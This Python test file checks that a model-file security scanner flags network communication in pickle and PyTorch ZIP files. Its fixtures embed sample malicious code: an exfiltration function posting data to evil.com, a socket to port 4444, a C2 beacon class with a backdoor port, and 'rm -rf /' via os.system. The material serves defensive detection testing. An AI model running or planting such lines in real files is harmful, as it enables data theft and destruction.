"""Integration tests for network communication detection with scanners."""

import pickle
import zipfile

from modelaudit.scanners.base import CheckStatus
from modelaudit.scanners.pickle_scanner import PickleScanner
from modelaudit.scanners.pytorch_zip_scanner import PyTorchZipScanner


class TestNetworkCommIntegration:
    """Test network communication detection integration with scanners."""

    def test_pickle_scanner_integration(self, tmp_path):
        """Test network communication detection in pickle scanner."""
        # Create a pickle file with network patterns
        test_file = tmp_path / "model_with_network.pkl"

        data = {
            "model_weights": [1.0, 2.0, 3.0],
            "config": {
                "server_url": "http://malicious-c2.com/upload",
                "beacon_interval": 60,
            },
            "code": b"""
import socket
import requests

def exfiltrate(data):
    requests.post('http://evil.com/steal', json=data)
    socket.connect(('192.168.1.100', 4444))
""",
        }

        with open(test_file, "wb") as f:
            pickle.dump(data, f)

        # Scan the file
        scanner = PickleScanner()
        result = scanner.scan(str(test_file))

        assert result is not None

        # Check that network communication was detected
        network_checks = [
            c for c in result.checks if "Network Communication" in c.name and c.status == CheckStatus.FAILED
        ]

        assert len(network_checks) > 0

        # Should detect multiple patterns
        messages = [c.message for c in network_checks]
        assert any("socket" in msg for msg in messages)
        assert any("requests" in msg or "http" in msg for msg in messages)

    def test_pytorch_zip_scanner_integration(self, tmp_path):
        """Test network communication detection in PyTorch ZIP scanner."""
        # Create a PyTorch ZIP file with network patterns
        test_file = tmp_path / "model_with_network.pt"

        with zipfile.ZipFile(test_file, "w") as zf:
            # Add model data
            model_data = {
                "state_dict": {"layer1.weight": [1.0, 2.0]},
                "network_config": "connect_to: evil.com:1337",
            }
            zf.writestr("data.pkl", pickle.dumps(model_data))

            # Add a Python file with network code
            network_code = b"""
import urllib.request
import socket

class NetworkExfiltrator:
    def __init__(self):
        self.c2_server = "http://command-control.net"
        self.backdoor_port = 31337

    def phone_home(self):
        urllib.request.urlopen(self.c2_server + "/beacon")

    def open_backdoor(self):
        s = socket.socket()
        s.connect(("0.0.0.0", self.backdoor_port))
"""
            zf.writestr("network_module.py", network_code)

        # Scan the file
        scanner = PyTorchZipScanner()
        result = scanner.scan(str(test_file))

        assert result is not None

        # Check that network communication was detected
        network_checks = [
            c for c in result.checks if "Network Communication" in c.name and c.status == CheckStatus.FAILED
        ]

        assert len(network_checks) > 0

        # Should detect suspicious patterns
        all_messages = " ".join(c.message for c in network_checks)
        # Check for backdoor detection (the scanner detects port 1337 as a common backdoor)
        assert "backdoor" in all_messages.lower() or "1337" in all_messages

    def test_network_detection_can_be_disabled(self, tmp_path):
        """Test that network detection can be disabled via config."""
        # Create a pickle file with network patterns
        test_file = tmp_path / "model.pkl"

        data = {
            "url": "http://malicious.com",
            "socket_code": b"socket.connect(('evil.com', 4444))",
        }

        with open(test_file, "wb") as f:
            pickle.dump(data, f)

        # Scan with network detection disabled
        scanner = PickleScanner(config={"check_network_comm": False})
        result = scanner.scan(str(test_file))

        # Should not have any network communication checks
        network_checks = [c for c in result.checks if "Network Communication" in c.name]

        assert len(network_checks) == 0

    def test_network_detection_severity_levels(self, tmp_path):
        """Test that different patterns have appropriate severity levels."""
        # Create a pickle with various severity patterns
        test_file = tmp_path / "severity_test.pkl"

        data = {
            # Critical: malware/backdoor patterns
            "malware_config": {"backdoor": True},
            # High: network libraries
            "imports": b"import socket",
            # Medium: regular URLs
            "url": "http://example.com",
        }

        with open(test_file, "wb") as f:
            pickle.dump(data, f)

        scanner = PickleScanner()
        result = scanner.scan(str(test_file))

        network_checks = [
            c for c in result.checks if "Network Communication" in c.name and c.status == CheckStatus.FAILED
        ]

        # Should have checks with different severities
        severities = [c.severity.value for c in network_checks]
        assert "critical" in severities  # malware/backdoor

    def test_combined_detections(self, tmp_path):
        """Test that network detection works alongside other detections."""
        # Create a pickle with multiple security issues
        test_file = tmp_path / "multi_issue.pkl"

        data = {
            # Network communication
            "c2_server": "http://evil.com",
            "network_lib": b"import socket",
            # Dangerous imports (existing check)
            "dangerous": b"import os\nos.system('rm -rf /')",
            # JIT/Script code
            "jit_code": b"torch.ops.aten.system('echo pwned')",
        }

        with open(test_file, "wb") as f:
            pickle.dump(data, f)

        scanner = PickleScanner()
        result = scanner.scan(str(test_file))

        # Should detect network communication issues
        network_checks = [
            c for c in result.checks if "Network Communication" in c.name and c.status == CheckStatus.FAILED
        ]

        assert len(network_checks) > 0

        # Should detect multiple network patterns
        network_messages = [c.message for c in network_checks]
        assert any("evil.com" in msg for msg in network_messages)
        assert any("socket" in msg for msg in network_messages)
        assert any("c2" in msg.lower() for msg in network_messages)

    def test_no_false_positives(self, tmp_path):
        """Test that clean models don't trigger false positives."""
        # Create a clean model file
        test_file = tmp_path / "clean_model.pkl"

        data = {
            "model_state": {
                "layer1.weight": [1.0, 2.0, 3.0, 4.0],
                "layer1.bias": [0.1, 0.2],
                "layer2.weight": [5.0, 6.0, 7.0, 8.0],
            },
            "optimizer_state": {
                "lr": 0.001,
                "momentum": 0.9,
                "weight_decay": 0.0001,
            },
            "training_config": {
                "batch_size": 32,
                "epochs": 100,
                "validation_split": 0.2,
            },
            "version": "1.0.0",
        }

        with open(test_file, "wb") as f:
            pickle.dump(data, f)

        scanner = PickleScanner()
        result = scanner.scan(str(test_file))

        # Should not have any failed network communication checks
        network_issues = [
            c for c in result.checks if "Network Communication" in c.name and c.status == CheckStatus.FAILED
        ]

        assert len(network_issues) == 0

        # Should have a passing network check
        network_pass = [
            c for c in result.checks if "Network Communication" in c.name and c.status == CheckStatus.PASSED
        ]

        assert len(network_pass) == 1
        assert "No network communication patterns detected" in network_pass[0].message
